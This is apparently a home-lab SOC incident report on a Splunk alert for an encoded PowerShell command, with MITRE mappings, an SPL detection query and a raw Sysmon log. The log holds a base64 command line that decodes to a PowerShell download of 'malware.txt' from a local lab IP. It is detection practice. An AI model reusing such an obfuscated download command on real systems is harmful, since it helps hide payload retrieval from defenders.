# Incident Report – Encoded-PowerShell Command Execution

## Date

2026-08-10 19:59:01 IST

## Severity

Medium

## Status

Resolved

## Affected Host

Windows 11

## Splunk Alert

PowerShell Encoded Command Detected

## MITRE ATT&CK


- Execution (T1059.001) – PowerShell – powershell.exe with -EncodedCommand
- Defense Evasion (T1027) – Obfuscated Files or Information – Base64 encoding
- Defense Evasion (T1027.010) – Command Obfuscation – -EncodedCommand parameter


## Description

The Alert detected an execution of a PowerShell Encoded Command which possibly indicates the malicious powershell execution.

## Evidence

### Alert Screenshot

![alert](\screenshots\Powershell-encoded-command\Triggered-Alert.png)

### Event Screenshot

![alert](\screenshots\Powershell-encoded-command\Event-log.png)

## SPL Query

```
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" powershell.exe *Encoded* | table _time ComputerName CommandLine Image
```

## Raw log snippet

```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
... 3 lines omitted ...
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMwAxAC4AMQA4ADUALwBtAGEAbAB3AGEAcgBlAC4AdAB4AHQAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAAoAbwB0AC0AYQAtAG0AYQBsAHcAYQByAGUALgB0AHgAdAAiAAoA
CurrentDirectory: C:\Users\windows\
Show all 38 lines
host = HP-Pavilionsource = WinEventLog:Microsoft-Windows-Sysmon/Operationalsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
```

### Log Source

- Host : HP-Pavalion
- Source : WinEventLog:Microsoft-Windows-Sysmon/Operational

## Response Actions Taken

- Verified Alert in Splunk.
- Confirmed Encoded PowerShell Command was executed.
- Recorded the activity as a True Positive during the lab simulation.

## Conclusion

The detection successfully identified the simulated PowerShell Encoded Command execution attack and generated the expected alert. The incident was investigated and confirmed as a true positive.
